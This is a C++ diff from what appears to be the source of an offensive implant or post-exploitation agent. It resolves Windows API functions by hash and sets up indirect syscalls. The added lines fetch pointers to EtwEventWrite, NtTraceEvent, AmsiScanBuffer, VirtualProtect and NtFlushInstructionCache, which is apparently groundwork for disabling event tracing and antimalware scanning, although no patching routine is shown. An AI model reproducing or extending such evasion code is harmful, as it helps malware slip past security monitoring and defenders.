@@ -59,6 +59,8 @@ namespace Procs
         BOOL bIndirectSyscalls
     ) {
         // NTAPI (Ntdll)
+        PVOID pEtwEventWrite                    = GetProcAddressByHash(hNtdll, HASH_FUNC_ETWEVENTWRITE);
+        pProcs->lpEtwEventWrite                 = reinterpret_cast<LPPROC_ETWEVENTWRITE>(pEtwEventWrite);
         PVOID pLdrLoadDll                       = GetProcAddressByHash(hNtdll, HASH_FUNC_LDRLOADDLL);
         pProcs->lpLdrLoadDll                    = reinterpret_cast<LPPROC_LDRLOADDLL>(pLdrLoadDll);
         PVOID pNtAdjustPrivilegesToken          = GetProcAddressByHash(hNtdll, HASH_FUNC_NTADJUSTPRIVILEGESTOKEN);
@@ -83,6 +85,8 @@ namespace Procs
         pProcs->lpNtEnumerateValueKey           = reinterpret_cast<LPPROC_NTENUMERATEVALUEKEY>(pNtEnumerateValueKey);
         PVOID pNtFreeVirtualMemory              = GetProcAddressByHash(hNtdll, HASH_FUNC_NTFREEVIRTUALMEMORY);
         pProcs->lpNtFreeVirtualMemory           = reinterpret_cast<LPPROC_NTFREEVIRTUALMEMORY>(pNtFreeVirtualMemory);
+        PVOID pNtFlushInstructionCache          = GetProcAddressByHash(hNtdll, HASH_FUNC_NTFLUSHINSTRUCTIONCACHE);
+        pProcs->lpNtFlushInstructionCache       = reinterpret_cast<LPPROC_NTFLUSHINSTRUCTIONCACHE>(pNtFlushInstructionCache);
         PVOID pNtGetContextThread               = GetProcAddressByHash(hNtdll, HASH_FUNC_NTGETCONTEXTTHREAD);
         pProcs->lpNtGetContextThread            = reinterpret_cast<LPPROC_NTGETCONTEXTTHREAD>(pNtGetContextThread);
         PVOID pNtOpenFile                       = GetProcAddressByHash(hNtdll, HASH_FUNC_NTOPENFILE);
@@ -121,6 +125,8 @@ namespace Procs
         pProcs->lpNtSystemDebugControl          = reinterpret_cast<LPPROC_NTSYSTEMDEBUGCONTROL>(pNtSystemDebugControl);
         PVOID pNtTerminateProcess               = GetProcAddressByHash(hNtdll, HASH_FUNC_NTTERMINATEPROCESS);
         pProcs->lpNtTerminateProcess            = reinterpret_cast<LPPROC_NTTERMINATEPROCESS>(pNtTerminateProcess);
+        PVOID pNtTraceEvent                     = GetProcAddressByHash(hNtdll, HASH_FUNC_NTTRACEEVENT);
+        pProcs->lpNtTraceEvent                  = reinterpret_cast<LPPROC_NTTRACEEVENT>(pNtTraceEvent);
         PVOID pNtUnmapViewOfSection             = GetProcAddressByHash(hNtdll, HASH_FUNC_NTUNMAPVIEWOFSECTION);
         pProcs->lpNtUnmapViewOfSection          = reinterpret_cast<LPPROC_NTUNMAPVIEWOFSECTION>(pNtUnmapViewOfSection);
         PVOID pNtWaitForSingleObject            = GetProcAddressByHash(hNtdll, HASH_FUNC_NTWAITFORSINGLEOBJECT);
@@ -245,6 +251,8 @@ namespace Procs
         pProcs->lpVirtualAllocEx                = reinterpret_cast<LPPROC_VIRTUALALLOCEX>(pVirtualAllocEx);
         PVOID pVirtualFree                      = GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALFREE);
         pProcs->lpVirtualFree                   = reinterpret_cast<LPPROC_VIRTUALFREE>(pVirtualFree);
+        PVOID pVirtualProtect                   = GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALPROTECT);
+        pProcs->lpVirtualProtect                = reinterpret_cast<LPPROC_VIRTUALPROTECT>(pVirtualProtect);
         PVOID pVirtualProtectEx                 = GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALPROTECTEX);
         pProcs->lpVirtualProtectEx              = reinterpret_cast<LPPROC_VIRTUALPROTECTEX>(pVirtualProtectEx);
         PVOID pWriteProcessMemory               = GetProcAddressByHash(hKernel32, HASH_FUNC_WRITEPROCESSMEMORY);
@@ -252,6 +260,7 @@ namespace Procs
 
         if (bIndirectSyscalls)
         {
+            pProcs->sysEtwEventWrite                = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pEtwEventWrite));
             pProcs->sysLdrLoadDll                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pLdrLoadDll));
             pProcs->sysNtAdjustPrivilegesToken      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtAdjustPrivilegesToken));
             pProcs->sysNtAllocateVirtualMemory      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtAllocateVirtualMemory));
@@ -263,6 +272,7 @@ namespace Procs
             pProcs->sysNtDeleteFile                 = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtDeleteFile));
             pProcs->sysNtDuplicateObject            = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtDuplicateObject));
             pProcs->sysNtEnumerateValueKey          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtEnumerateValueKey));
+            pProcs->sysNtFlushInstructionCache      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtFlushInstructionCache));
             pProcs->sysNtFreeVirtualMemory          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtFreeVirtualMemory));
             pProcs->sysNtGetContextThread           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtGetContextThread));
             pProcs->sysNtOpenFile                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenFile));
@@ -282,8 +292,9 @@ namespace Procs
             pProcs->sysNtSetContextThread           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSetContextThread));
             pProcs->sysNtSetInformationFile         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSetInformationFile));
             pProcs->sysNtSystemDebugControl         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSystemDebugControl));
-            pProcs->sysNtUnmapViewOfSection         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtUnmapViewOfSection));
             pProcs->sysNtTerminateProcess           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtTerminateProcess));
+            pProcs->sysNtTraceEvent                 = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtTraceEvent));
+            pProcs->sysNtUnmapViewOfSection         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtUnmapViewOfSection));
             pProcs->sysNtWaitForSingleObject        = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWaitForSingleObject));
             pProcs->sysNtWriteFile                  = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWriteFile));
             pProcs->sysNtWriteVirtualMemory         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWriteVirtualMemory));
@@ -298,6 +309,7 @@ namespace Procs
     VOID FindProcsMisc(
         Procs::PPROCS pProcs,
         HMODULE hAdvapi32,
+        HMODULE hAmsi,
         HMODULE hBcrypt,
         HMODULE hCrypt32,
         HMODULE hDbghelp,
@@ -347,6 +359,10 @@ namespace Procs
         pProcs->lpRegSetValueExW                = reinterpret_cast<LPPROC_REGSETVALUEEXW>(pRegSetValueExW);
         PVOID pRevertToSelf                     = GetProcAddressByHash(hAdvapi32, HASH_FUNC_REVERTTOSELF);
         pProcs->lpRevertToSelf                  = reinterpret_cast<LPPROC_REVERTTOSELF>(pRevertToSelf);
+
+        // Amsi
+        PVOID pAmsiScanBuffer                   = GetProcAddressByHash(hAmsi, HASH_FUNC_AMSISCANBUFFER);
+        pProcs->lpAmsiScanBuffer                = reinterpret_cast<LPPROC_AMSISCANBUFFER>(pAmsiScanBuffer);
 
         // Bcrypt
         PVOID pBCryptCloseAlgorithmProvider     = GetProcAddressByHash(hBcrypt, HASH_FUNC_BCRYPTCLOSEALGORITHMPROVIDER);
